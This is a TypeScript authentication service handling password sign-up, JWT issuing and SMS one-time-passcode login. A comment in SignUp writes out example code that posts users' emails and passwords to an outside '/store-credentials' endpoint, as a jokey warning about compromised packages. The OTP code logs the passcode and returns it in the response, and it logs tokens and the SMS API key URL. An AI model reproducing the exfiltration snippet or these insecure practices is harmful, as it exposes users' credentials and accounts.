import { Service, Inject, Container } from 'typedi';
import jwt from 'jsonwebtoken';
import MailerService from './mailer';
import config from '../config';
import argon2 from 'argon2';
import { randomBytes } from 'crypto';
import { IUser, IUserInputDTO } from '../interfaces/IUser';
import { EventDispatcher, EventDispatcherInterface } from '../decorators/eventDispatcher';
import events from '../subscribers/events';
import ErrorHandler from '../utility/errors';
import { ERROR_CODES } from '../config/errors';
import twilioService from './twilio';
import axios from 'axios';

const fast2sms = require('fast-two-sms');

@Service()
export default class AuthService {
  constructor(
    @Inject('userModel') private userModel: Models.UserModel,
    // private mailer: MailerService,
    @Inject('logger') private logger,
    @EventDispatcher() private eventDispatcher: EventDispatcherInterface,
  ) {}

  public async SignUp(userInputDTO: IUserInputDTO): Promise<{ user: IUser; token: string }> {
    try {
      const salt = randomBytes(32);

      /**
       * Here you can call to your third-party malicious server and steal the user password before it's saved as a hash.
       * require('http')
       *  .request({
       *     hostname: 'http://my-other-api.com/',
       *     path: '/store-credentials',
       *     port: 80,
       *     method: 'POST',
       * }, ()=>{}).write(JSON.stringify({ email, password })).end();
       *
       * Just kidding, don't do that!!!
       *
       * But what if, an NPM module that you trust, like body-parser, was injected with malicious code that
       * watches every API call and if it spots a 'password' and 'email' property then
       * it decides to steal them!? Would you even notice that? I wouldn't :/
       */
      this.logger.silly('Hashing password');
      const hashedPassword = await argon2.hash(userInputDTO.password, { salt });
      this.logger.silly('Creating user db record');
      const userRecord = await this.userModel.create({
        ...userInputDTO,
        salt: salt.toString('hex'),
        password: hashedPassword,
      });
      this.logger.silly('Generating JWT');
      const token = this.generateToken(userRecord);

      if (!userRecord) {
        throw new Error('User cannot be created');
      }
      this.logger.silly('Sending welcome email');
      // await this.mailer.SendWelcomeEmail(userRecord);

      this.eventDispatcher.dispatch(events.user.signUp, { user: userRecord });

      /**
       * @TODO This is not the best way to deal with this
       * There should exist a 'Mapper' layer
       * that transforms data from layer to layer
       * but that's too over-engineering for now
       */
      const user: any = userRecord.toObject();
      Reflect.deleteProperty(user, 'password');
      Reflect.deleteProperty(user, 'salt');
      return { user, token };
    } catch (e) {
      this.logger.error(e);
      throw e;
    }
  }

  public async SignIn(email: string, password: string): Promise<{ user: IUser; token: string }> {
    const userRecord = await this.userModel.findOne({ email });
    if (!userRecord) {
      throw new Error('User not registered');
    }
    /**
     * We use verify from argon2 to prevent 'timing based' attacks
     */
    this.logger.silly('Checking password');
    const validPassword = await argon2.verify(userRecord.password, password);
    if (validPassword) {
      this.logger.silly('Password is valid!');
      this.logger.silly('Generating JWT');
      const token = this.generateToken(userRecord);

      const user: any = userRecord.toObject();
      Reflect.deleteProperty(user, 'password');
      Reflect.deleteProperty(user, 'salt');
      /**
       * Easy as pie, you don't need passport.js anymore :)
       */
      return { user, token };
    } else {
      throw new Error('Invalid Password');
    }
  }

  private generateToken(user) {
    const today = new Date();
    const exp = new Date(today);
    exp.setDate(today.getDate() + 60);

    /**
     * A JWT means JSON Web Token, so basically it's a json that is _hashed_ into a string
     * The cool thing is that you can add custom properties a.k.a metadata
     * Here we are adding the userId, role and name
     * Beware that the metadata is public and can be decoded without _the secret_
     * but the client cannot craft a JWT to fake a userId
     * because it doesn't have _the secret_ to sign it
     * more information here: https://softwareontheroad.com/you-dont-need-passport
     */
    this.logger.silly(`Sign JWT for userId: ${user._id}`);
    return jwt.sign(
      {
        _id: user._id, // We are gonna use this in the middleware 'isAuth'
        role: user.role,
        name: user.name,
        phone: user.phone,
      },
      config.jwtSecret,
    );
  }

  public async generateOtp(input: { phone: string }) {
    try {
      this.logger.info('Generate OTP Service Starts here %o', input);
      const user: any = await this.userModel.findOne({ phone: input.phone });
      this.logger.info('user exists db response %o', user);
      const staticOTP = Math.floor(100000 + Math.random() * 900000);
      this.logger.info('Static OTP is %o', staticOTP);
      if (!user) {
        const addUser = await this.userModel.create({
          phone: input.phone,
        });
        this.logger.debug('Add user %o', addUser);
      }
      await this.userModel.updateOne({ phone: input.phone }, { otp: staticOTP });
      const twilioServiceInstance = Container.get(twilioService);
      //! for the time being we are disabling twilio
      // const response = await twilioServiceInstance.generateOtp(input.phone as string);
      const message = `Your Agrarian verification code is: ${staticOTP}. Please do not share this code.`;
      const phone = input.phone.substring(3);
      this.logger.debug('Message is %o and phone number %o', message, phone);
      //! for the time being we are disabling fast2sms without DLT service
      const axiosReqObj = {
        url: `https://www.fast2sms.com/dev/bulkV2?authorization=${config.fast2sms.apiKey}&variables_values=${staticOTP}&route=otp&numbers=${phone}`,
        method: 'GET',
      };
      this.logger.debug('Axios obj for req deliver fast2sms API %o', axiosReqObj);
      const response: any = await axios(axiosReqObj);
      // const data: any = JSON.stringify(response);
      // const response = await fast2sms.sendMessage({
      //   authorization: config.fast2sms.apiKey,
      //   message: message,
      //   numbers: [phone],
      // });
      // this.logger.info('Generate OTP Twilio response in generate otp service %o', response);
      this.logger.info('Generate OTP fast2sms response in generate otp service %o');
      return {
        message: "message sent successfully1",
        otp: staticOTP
      };
      // throw new ErrorHandler.BadError('Error ocurred in sending the OTP ');
    } catch (err) {
      if (err instanceof ErrorHandler.BadError) {
        this.logger.error('Generate Otp service fails with error %o', err);
        throw err;
      } else {
        this.logger.error('Generate Otp service end with error %o', err);
        throw new ErrorHandler.BadError(ErrorHandler.getErrorMessageWithCode(ERROR_CODES.AGGOTP));
      }
    }
  }
  public async verifyOtp(input: any) {
    try {
      this.logger.info('verify otp service starts here %o', input);
      // const twilioServiceInstance = Container.get(twilioService);
      // const twilioResponse = await twilioServiceInstance.verifyOtp(input);
      let response = {};
      const user: any = await this.userModel.findOne({ phone: input.phone });
      this.logger.debug('user db response in verify otp service %o', user);
      const token = this.generateToken(user);
      this.logger.info('Token response in verify otp %o', token);
      //! for the time being we are disabling twilio
      // if (twilioResponse.status === status.approved) {
      //   response = {
      //     status: 'Approved',
      //     token: token,
      //   };
      if (user?.otp === parseInt(input.otp, 10)) {
        response = {
          status: 'Approved',
          token: token,
        };
      } else {
        // this.logger.error("OOPS! Error in verify otp service %o", error)
        throw new ErrorHandler.BadError('OOPS! Something went wrong please try again later.');
      }
      this.logger.debug('Response object in verify otp service %o', response);
      return response;
    } catch (err) {
      if (err instanceof ErrorHandler.BadError) {
        this.logger.error('verify Otp service fails with error %o', err);
        throw err;
      } else {
        this.logger.error('verify Otp service end with error %o', err);
        throw new ErrorHandler.BadError(ErrorHandler.getErrorMessageWithCode(ERROR_CODES.AGVOTP));
      }
    }
  }
}
